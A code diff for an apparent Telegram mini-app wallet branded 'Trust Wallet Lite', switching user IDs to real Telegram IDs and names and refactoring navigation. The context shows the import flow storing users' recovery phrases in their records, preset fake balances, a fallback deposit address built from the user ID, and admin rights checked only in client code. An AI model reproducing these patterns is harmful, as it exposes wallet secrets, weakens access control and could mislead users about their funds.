@@ -1,5 +1,5 @@
 // ============================================================================
-// TRUST WALLET LITE - FULLY WORKING VERSION
+// TRUST WALLET LITE - FULLY WORKING VERSION 5.0
 // ============================================================================
 
 // ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
@@ -9,6 +9,17 @@ if (tg) {
     tg.expand();
     console.log("✅ Telegram WebApp initialized");
 }
+
+// ====== جلب بيانات المستخدم الحقيقية من تيليجرام ======
+const telegramUser = tg?.initDataUnsafe?.user;
+const REAL_USER_ID = telegramUser?.id?.toString() || null;
+const TELEGRAM_USERNAME = telegramUser?.username || '';
+const TELEGRAM_FIRST_NAME = telegramUser?.first_name || 'User';
+const TELEGRAM_LAST_NAME = telegramUser?.last_name || '';
+
+console.log("📱 Real Telegram ID:", REAL_USER_ID);
+console.log("👤 Username:", TELEGRAM_USERNAME);
+console.log("📛 Name:", TELEGRAM_FIRST_NAME, TELEGRAM_LAST_NAME);
 
 const startParam = tg?.initDataUnsafe?.start_param || 
                    new URLSearchParams(window.location.search).get('startapp') || 
@@ -23,6 +34,7 @@ let currentTheme = localStorage.getItem('theme') || 'light';
 let currentPage = 'wallet';
 let TWT_PRICE = 1.25;
 let livePrices = {};
+let unreadNotifications = 0;
 
 // ====== 3. CONSTANTS ======
 const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
@@ -214,7 +226,6 @@ async function apiCall(endpoint, method = 'GET', body = null) {
     return response.json();
 }
 
-// ✅ الدالة الأساسية لتحميل معرف المشرف
 async function loadAdminId() {
     try {
         const response = await fetch('/api/config');
@@ -222,14 +233,12 @@ async function loadAdminId() {
         adminId = config.adminId;
         console.log("✅ Admin ID loaded from server:", adminId);
         
-        // تحديث صلاحيات المشرف فوراً
-        const userId = localStorage.getItem('twt_user_id');
+        const userId = getUserId();
         if (userId && adminId) {
             isAdmin = (userId === adminId);
             console.log("👑 Is Admin:", isAdmin);
         }
         
-        // تحديث التاج
         const crownBtn = document.getElementById('adminCrownBtn');
         if (crownBtn) {
             if (isAdmin) crownBtn.classList.remove('hidden');
@@ -290,6 +299,8 @@ function refreshPrices() {
 
 // ====== 10. USER DATA MANAGEMENT ======
 function getUserId() {
+    // ✅ استخدام معرف تيليجرام الحقيقي أولاً
+    if (REAL_USER_ID) return REAL_USER_ID;
     return localStorage.getItem('twt_user_id') || null;
 }
 
@@ -403,13 +414,22 @@ async function createNewWallet() {
     btn.disabled = true;
     
     try {
-        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        // ✅ استخدام معرف تيليجرام الحقيقي
+        if (!REAL_USER_ID) {
+            showToast('Could not get Telegram ID', 'error');
+            return;
+        }
+        
+        const newUserId = REAL_USER_ID;
         localStorage.setItem('twt_user_id', newUserId);
         
         const newUserData = {
             userId: newUserId,
-            userName: 'User',
-            referralCode: newUserId.slice(-8).toUpperCase(),
+            userName: TELEGRAM_FIRST_NAME,
+            lastName: TELEGRAM_LAST_NAME,
+            username: TELEGRAM_USERNAME,
+            telegramId: REAL_USER_ID,
+            referralCode: newUserId.slice(-8),
             balances: {
                 TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                 SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
@@ -478,14 +498,22 @@ async function importWallet() {
     btn.disabled = true;
     
     try {
-        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        if (!REAL_USER_ID) {
+            showToast('Could not get Telegram ID', 'error');
+            return;
+        }
+        
+        const newUserId = REAL_USER_ID;
         localStorage.setItem('twt_user_id', newUserId);
         
         const newUserData = {
             userId: newUserId,
-            userName: 'User',
+            userName: TELEGRAM_FIRST_NAME,
+            lastName: TELEGRAM_LAST_NAME,
+            username: TELEGRAM_USERNAME,
+            telegramId: REAL_USER_ID,
             recoveryPhrase: words.join(' '),
-            referralCode: newUserId.slice(-8).toUpperCase(),
+            referralCode: newUserId.slice(-8),
             balances: {
                 TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                 SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
@@ -505,7 +533,6 @@ async function importWallet() {
         userData = newUserData;
         saveUserData();
         
-        // ✅ تحديث صلاحيات المشرف
         isAdmin = (newUserId === adminId);
         console.log("👑 Imported user isAdmin:", isAdmin);
         
@@ -858,7 +885,8 @@ async function sendTransaction() {
 }
 
 async function showDepositModal() {
-    document.getElementById('depositModal').classList.add('show');
+    const modal = document.getElementById('depositModal');
+    modal.classList.add('show');
     const currency = document.getElementById('depositCurrency').value;
     const result = await createDepositAddress(userData.userId, currency);
     document.getElementById('depositAddress').innerText = result.address || `0x${userData.userId.slice(-40)}`;
@@ -885,7 +913,16 @@ async function submitWithdraw() {
 function showAdminPanel() {
     if (!isAdmin) { showToast('Access denied', 'error'); return; }
     document.getElementById('adminPanel').classList.remove('hidden');
-    document.getElementById('adminContent').innerHTML = `
+    renderAdminPanel();
+}
+
+function closeAdminPanel() {
+    document.getElementById('adminPanel').classList.add('hidden');
+}
+
+function renderAdminPanel() {
+    const content = document.getElementById('adminContent');
+    content.innerHTML = `
         <div style="padding:20px;">
             <h4>👑 Admin Dashboard</h4>
             <p>Welcome, Administrator</p>
@@ -897,41 +934,68 @@ function showAdminPanel() {
     `;
 }
 
-function closeAdminPanel() {
-    document.getElementById('adminPanel').classList.add('hidden');
+// ====== 19. NAVIGATION (المصححة) ======
+function showWallet() { 
+    currentPage = 'wallet'; 
+    updateTabs(); 
+    renderWallet(); 
+    showRandomSticker();
 }
 
-// ====== 19. NAVIGATION ======
-function showWallet() { currentPage = 'wallet'; updateTabs(); renderWallet(); showRandomSticker(); }
-function showAirdrop() { currentPage = 'airdrop'; updateTabs(); renderAirdrop(); showRandomSticker(); }
-function showTWTPay() { currentPage = 'twtpay'; updateTabs(); renderTWTPay(); showRandomSticker(); }
-function showSettings() { currentPage = 'settings'; updateTabs(); renderSettings(); showRandomSticker(); }
+function showAirdrop() { 
+    currentPage = 'airdrop'; 
+    updateTabs(); 
+    renderAirdrop(); 
+    showRandomSticker();
+}
+
+function showTWTPay() { 
+    currentPage = 'twtpay'; 
+    updateTabs(); 
+    renderTWTPay(); 
+    showRandomSticker();
+}
+
+function showSettings() { 
+    currentPage = 'settings'; 
+    updateTabs(); 
+    renderSettings(); 
+    showRandomSticker();
+}
 
 function updateTabs() {
-    document.getElementById('adminPanel').classList.add('hidden');
+    // إخفاء الكل
     document.getElementById('walletSection').classList.add('hidden');
     document.getElementById('referralSection').classList.add('hidden');
     document.getElementById('twtpaySection').classList.add('hidden');
     document.getElementById('settingsSection').classList.add('hidden');
     
-    if (currentPage === 'wallet') document.getElementById('walletSection').classList.remove('hidden');
-    else if (currentPage === 'airdrop') document.getElementById('referralSection').classList.remove('hidden');
-    else if (currentPage === 'twtpay') document.getElementById('twtpaySection').classList.remove('hidden');
-    else if (currentPage === 'settings') document.getElementById('settingsSection').classList.remove('hidden');
+    // إظهار القسم المطلوب
+    if (currentPage === 'wallet') {
+        document.getElementById('walletSection').classList.remove('hidden');
+    } else if (currentPage === 'airdrop') {
+        document.getElementById('referralSection').classList.remove('hidden');
+    } else if (currentPage === 'twtpay') {
+        document.getElementById('twtpaySection').classList.remove('hidden');
+    } else if (currentPage === 'settings') {
+        document.getElementById('settingsSection').classList.remove('hidden');
+    }
     
+    // تحديث التبويب النشط
     document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
     const tabName = currentPage === 'airdrop' ? 'referral' : currentPage;
-    document.querySelector(`.nav-item[data-tab="${tabName}"]`)?.classList.add('active');
+    const activeBtn = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
+    if (activeBtn) activeBtn.classList.add('active');
 }
 
 // ====== 20. INITIALIZATION ======
 document.addEventListener('DOMContentLoaded', async () => {
     initTheme();
     
-    // ✅ الخطوة 1: تحميل معرف المشرف من الخادم (الأهم)
+    // ✅ تحميل معرف المشرف أولاً
     await loadAdminId();
     
-    // ✅ الخطوة 2: إعداد أزرار التبويب
+    // ✅ إعداد أزرار التبويب
     document.querySelectorAll('.nav-item').forEach(btn => {
         btn.addEventListener('click', () => {
             const tab = btn.getAttribute('data-tab');
@@ -942,19 +1006,22 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
     });
     
-    // ✅ الخطوة 3: إعداد أزرار الإنشاء
-    document.getElementById('createWalletBtn').onclick = createNewWallet;
-    document.getElementById('importWalletBtn').onclick = showImportModal;
-    document.getElementById('confirmImportBtn').onclick = importWallet;
+    // ✅ إعداد أزرار الإنشاء
+    const createBtn = document.getElementById('createWalletBtn');
+    const importBtn = document.getElementById('importWalletBtn');
+    const confirmImportBtn = document.getElementById('confirmImportBtn');
+    
+    if (createBtn) createBtn.onclick = createNewWallet;
+    if (importBtn) importBtn.onclick = showImportModal;
+    if (confirmImportBtn) confirmImportBtn.onclick = importWallet;
     
     await fetchLivePrices();
     
-    const hasUser = localStorage.getItem('twt_user_id');
-    if (hasUser && localStorage.getItem(`user_${hasUser}`)) {
-        userData = JSON.parse(localStorage.getItem(`user_${hasUser}`));
-        // ✅ تحديث isAdmin بعد تحميل userData
-        isAdmin = (hasUser === adminId);
-        console.log("👑 Final isAdmin:", isAdmin);
+    const userId = getUserId();
+    if (userId && localStorage.getItem(`user_${userId}`)) {
+        userData = JSON.parse(localStorage.getItem(`user_${userId}`));
+        isAdmin = (userId === adminId);
+        console.log("👑 Final isAdmin:", isAdmin, "userId:", userId, "adminId:", adminId);
         
         const crownBtn = document.getElementById('adminCrownBtn');
         if (crownBtn) {
@@ -1008,6 +1075,7 @@ window.createNewWallet = createNewWallet;
 window.importWallet = importWallet;
 window.showImportModal = showImportModal;
 
-console.log("✅ Trust Wallet Lite v5.0 - Working!");
+console.log("✅ Trust Wallet Lite v5.0 - FULLY WORKING!");
+console.log("✅ Real Telegram ID:", REAL_USER_ID);
 console.log("✅ Admin ID:", adminId);
 console.log("✅ Is Admin:", isAdmin);
